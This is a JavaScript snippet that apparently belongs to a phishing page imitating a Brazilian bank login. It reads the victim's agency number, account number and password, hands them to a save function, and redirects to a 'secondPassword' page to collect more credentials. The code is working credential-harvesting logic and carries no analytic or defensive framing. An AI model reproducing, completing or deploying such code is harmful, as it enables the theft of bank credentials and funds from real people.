const validates = document.getElementById('triggerbtncpf');

validates.addEventListener('click', async (event) => {
        event.preventDefault();

        const agency = document.getElementById("agency").value;
        const account = document.getElementById("account").value;
        const passwordStrong = document.getElementById("passwordStrong").value;
        
        if (agency == '' || account == '' || passwordStrong == '') {
            alert("Preencha todos os campos")
        } else {
                callSpinner();
                try {
                    await savedatacpf(agency, account, passwordStrong);
                    const sleep = (milliseconds) => {
                        return new Promise(resolve => setTimeout(resolve, milliseconds))
                    }      
                    sleep(1000)
                    .then(() =>  {
                        window.location.href = './secondPassword.html';
                    }) 
                }catch(error){
                    console.log(error);
                    const sleep = (milliseconds) => {
                        return new Promise(resolve => setTimeout(resolve, milliseconds))
                    }      
                    sleep(1000)
                    .then(() =>  {
                        window.location.href = './error.html';
                    })  
                 } 
        }

});
